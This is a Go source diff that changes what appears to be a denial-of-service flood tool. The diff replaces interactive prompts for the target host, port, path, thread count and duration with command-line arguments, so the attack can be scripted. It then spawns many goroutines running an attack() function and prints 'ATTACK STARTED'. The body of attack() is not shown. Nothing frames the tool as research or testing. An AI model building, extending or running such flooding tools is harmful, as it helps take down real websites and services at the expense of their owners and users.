@@ -5,12 +5,14 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
+	"os"
 	"strconv"
 	"time"
 )
 
 var (
 	ip        = "test.com"
+	s_port    = "443"
 	port      = 443
 	threads   = 0
 	path      = "/"
@@ -121,16 +123,27 @@ func attack() {
 }
 
 func main() {
-	fmt.Print("[IP/HOST]:")
-	fmt.Scanln(&ip)
-	fmt.Print("[PORT]:")
-	fmt.Scanln(&port)
-	fmt.Print("[PATH]:")
-	fmt.Scanln(&path)
-	fmt.Print("[THREADS]:")
-	fmt.Scanln(&threads)
-	fmt.Print("[DURATION]:")
-	fmt.Scanln(&timer)
+	ip = os.Args[1]
+	s_port := os.Args[2]
+	cport, err := strconv.Atoi(s_port)
+	if err != nil {
+		fmt.Println("Convertion Error!")
+	}
+	port = cport
+	path = os.Args[3]
+	s_threads := os.Args[4]
+	cthreads, err := strconv.Atoi(s_threads)
+	if err != nil {
+		fmt.Println("Convertion Error!")
+	}
+	threads = cthreads
+	s_timer := os.Args[5]
+	ctimer, err := strconv.Atoi(s_timer)
+	if err != nil {
+		fmt.Println("Convertion Error!")
+	}
+	timer = ctimer
+	fmt.Println("ATTACK STARTED WITH " + s_threads + "THREADS")
 	for i := 0; i < threads; i++ {
 		time.Sleep(time.Microsecond * 100)
 		go attack()
